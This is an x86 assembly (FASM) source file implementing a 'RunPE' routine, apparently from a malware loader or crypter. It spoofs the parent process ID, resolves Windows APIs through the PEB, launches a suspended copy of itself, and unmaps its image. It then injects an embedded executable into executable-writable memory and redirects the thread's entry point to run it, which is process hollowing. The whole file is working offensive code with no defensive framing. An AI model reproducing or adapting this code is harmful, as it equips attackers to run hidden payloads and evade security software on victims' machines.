proc RunPE Executable:DWORD
	local	ProcessBasicInformation:PROCESS_BASIC_INFORMATION
	local	StartupInformation:STARTUPINFOEXW
	local	ProcessInformation:PROCESS_INFORMATION
	local	ExecutablePath[MAX_PATH + 1]:WORD
	local	CommandLine:DWORD
	local	ParentProcessHandle:DWORD
	local	ImageBase:DWORD
	local	EntryPoint:DWORD
	local	SizeOfHeaders:DWORD
	local	SizeOfImage:DWORD
	local	NumberOfSections:DWORD
	local	ProcThreadAttributeListSize:DWORD
	local	Context:DWORD
	local	RetryCounter:DWORD
	local	SectionCounter:DWORD

	; Get executable path
	lea		eax, [ExecutablePath]
	pebcall	PEB_Kernel32Dll, PEB_GetModuleFileNameW, NULL, eax, MAX_PATH
	cmp		eax, 0
	jle		.error

	; Get commandline
	pebcall	PEB_Kernel32Dll, PEB_GetCommandLineW
	test	eax, eax
	jz		.error
	mov		[CommandLine], eax

	; Get parent process ID
	lea		eax, [ProcessBasicInformation]
	pebcall	PEB_NtdllDll, PEB_NtQueryInformationProcess, -1, 0, eax, sizeof.PROCESS_BASIC_INFORMATION, 0
	test	eax, eax
	jnz		.error

	; Get parent process handle
	pebcall	PEB_Kernel32Dll, PEB_OpenProcess, PROCESS_CREATE_PROCESS, FALSE, [ProcessBasicInformation.InheritedFromUniqueProcessId]
	test	eax, eax
	jz		.error
	mov		[ParentProcessHandle], eax

	; Parse executable
	mov		eax, [Executable]
	add		eax, [eax + IMAGE_DOS_HEADER.e_lfanew]
	mov		ebx, [eax + IMAGE_NT_HEADERS32.OptionalHeader.ImageBase]
	mov		[ImageBase], ebx
	mov		ebx, [eax + IMAGE_NT_HEADERS32.OptionalHeader.AddressOfEntryPoint]
	mov		[EntryPoint], ebx
	mov		ebx, [eax + IMAGE_NT_HEADERS32.OptionalHeader.SizeOfHeaders]
	mov		[SizeOfHeaders], ebx
	mov		ebx, [eax + IMAGE_NT_HEADERS32.OptionalHeader.SizeOfImage]
	mov		[SizeOfImage], ebx
	movzx	ebx, word[eax + IMAGE_NT_HEADERS32.FileHeader.NumberOfSections]
	mov		[NumberOfSections], ebx

	; Retry up to 5 times
	mov		[RetryCounter], 5
.L_retry:
	; ZeroMemory StartupInformation
	lea		edi, [StartupInformation]
	mov		ecx, sizeof.STARTUPINFOEXW
	xor		eax, eax
	cld
	rep		stosb

	; Get size of PROC_THREAD_ATTRIBUTE_LIST
	mov		[ProcThreadAttributeListSize], 0
	lea		eax, [ProcThreadAttributeListSize]
	pebcall	PEB_KernelbaseDll, PEB_InitializeProcThreadAttributeList, NULL, 1, 0, eax
	cmp		[ProcThreadAttributeListSize], 0
	je		.C_retry

	; Allocate PROC_THREAD_ATTRIBUTE_LIST
	pebcall	PEB_Kernel32Dll, PEB_GetProcessHeap
	pebcall	PEB_NtdllDll, PEB_RtlAllocateHeap, eax, 0, [ProcThreadAttributeListSize]
	test	eax, eax
	jz		.C_retry
	mov		[StartupInformation + STARTUPINFOEXW.lpAttributeList], eax

	; Initialize attribute list
	lea		eax, [ProcThreadAttributeListSize]
	pebcall	PEB_KernelbaseDll, PEB_InitializeProcThreadAttributeList, [StartupInformation + STARTUPINFOEXW.lpAttributeList], 1, 0, eax
	test	eax, eax
	jz		.C_retry

	; Update attribute list
	lea		eax, [ParentProcessHandle]
	pebcall	PEB_KernelbaseDll, PEB_UpdateProcThreadAttribute, [StartupInformation + STARTUPINFOEXW.lpAttributeList], 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, eax, 4, NULL, NULL
	test	eax, eax
	jz		.C_retry

	; Create process
	lea		eax, [ExecutablePath]
	lea		ebx, [StartupInformation]
	mov		[ebx + STARTUPINFOEXW.StartupInfo.cb], sizeof.STARTUPINFOEXW
	lea		ecx, [ProcessInformation]
	pebcall	PEB_Kernel32Dll, PEB_CreateProcessW, eax, [CommandLine], NULL, NULL, FALSE, CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, ebx, ecx
	test	eax, eax
	jnz		@f

	; If GetLastError != ERROR_ELEVATION_REQUIRED, retry
	pebcall	PEB_Kernel32Dll, PEB_GetLastError
	cmp		eax, ERROR_ELEVATION_REQUIRED
	jne		.C_retry

	; If GetLastError == ERROR_ELEVATION_REQUIRED, repeat without parent process ID spoofing
	; This happens, if the manifest specifies requireAdministrator
	lea		eax, [ExecutablePath]
	lea		ebx, [StartupInformation]
	mov		[ebx + STARTUPINFOEXW.StartupInfo.cb], sizeof.STARTUPINFOEXW
	lea		ecx, [ProcessInformation]
	pebcall	PEB_Kernel32Dll, PEB_CreateProcessW, eax, [CommandLine], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, ebx, ecx
	test	eax, eax
	jz		.C_retry
@@:

	; Unmap process memory
	pebcall	PEB_NtdllDll, PEB_NtUnmapViewOfSection, [ProcessInformation + PROCESS_INFORMATION.hProcess], [ImageBase]

	; Allocate memory
	pebcall	PEB_Kernel32Dll, PEB_VirtualAllocEx, [ProcessInformation + PROCESS_INFORMATION.hProcess], [ImageBase], [SizeOfImage], MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE
	test	eax, eax
	jz		.C_retry_terminate

	; Write section headers
	pebcall	PEB_Kernel32Dll, PEB_WriteProcessMemory, [ProcessInformation + PROCESS_INFORMATION.hProcess], [ImageBase], [Executable], [SizeOfHeaders], NULL
	test	eax, eax
	jz		.C_retry_terminate

	; Write sections
	mov		[SectionCounter], 0
.L_sections:
	; Get section header
	mov		ebx, [Executable]
	mov		ebx, [ebx + IMAGE_DOS_HEADER.e_lfanew]
	add		ebx, [Executable]
	add		ebx, sizeof.IMAGE_NT_HEADERS32
	mov		edx, [SectionCounter]
	imul	edx, sizeof.IMAGE_SECTION_HEADER
	add		ebx, edx

	; Write RawData to target process
	mov		edi, [ImageBase]
	add		edi, [ebx + IMAGE_SECTION_HEADER.VirtualAddress]
	mov		esi, [Executable]
	add		esi, [ebx + IMAGE_SECTION_HEADER.PointerToRawData]
	mov		ecx, [ebx + IMAGE_SECTION_HEADER.SizeOfRawData]
	test	ecx, ecx
	jz		.C_sections
	pebcall	PEB_Kernel32Dll, PEB_WriteProcessMemory, [ProcessInformation + PROCESS_INFORMATION.hProcess], edi, esi, ecx, NULL
	test	eax, eax
	jz		.C_retry_terminate

.C_sections:
	inc		[SectionCounter]
	mov		eax, [NumberOfSections]
	cmp		[SectionCounter], eax
	jl		.L_sections

	; Allocate CONTEXT32
	pebcall	PEB_Kernel32Dll, PEB_GetProcessHeap
	pebcall	PEB_NtdllDll, PEB_RtlAllocateHeap, eax, 0, sizeof.CONTEXT32
	test	eax, eax
	jz		.C_retry_terminate
	mov		[Context], eax

	; Get thread context
	mov		eax, [Context]
	mov		[eax + CONTEXT32.ContextFlags], WOW64_CONTEXT_i386 or WOW64_CONTEXT_INTEGER
	pebcall	PEB_Kernel32Dll, PEB_GetThreadContext, [ProcessInformation + PROCESS_INFORMATION.hThread], eax
	test	eax, eax
	jz		.C_retry_terminate

	; Write base address to ebx + 8
	mov		edi, [Context]
	mov		edi, [edi + CONTEXT32.Ebx]
	add		edi, 8
	lea		esi, [ImageBase]
	pebcall	PEB_Kernel32Dll, PEB_WriteProcessMemory, [ProcessInformation + PROCESS_INFORMATION.hProcess], edi, esi, 4, NULL
	test	eax, eax
	jz		.C_retry_terminate

	; Write entry point to eax
	mov		eax, [ImageBase]
	add		eax, [EntryPoint]
	mov		ebx, [Context]
	mov		[ebx + CONTEXT32.Eax], eax

	; Set thread context
	pebcall	PEB_Kernel32Dll, PEB_SetThreadContext, [ProcessInformation + PROCESS_INFORMATION.hThread], [Context]
	test	eax, eax
	jz		.C_retry_terminate

	; Resume thread
	pebcall	PEB_Kernel32Dll, PEB_ResumeThread, [ProcessInformation + PROCESS_INFORMATION.hThread]
	cmp		eax, -1
	je		.C_retry_terminate

	mov		eax, 1
	ret

.C_retry_terminate:
	pebcall	PEB_Kernel32Dll, PEB_TerminateProcess, [ProcessInformation + PROCESS_INFORMATION.hProcess], 0
.C_retry:
	dec		[RetryCounter]
	cmp		[RetryCounter], 0
	jg		.L_retry

.error:
	xor		eax, eax
	ret
endp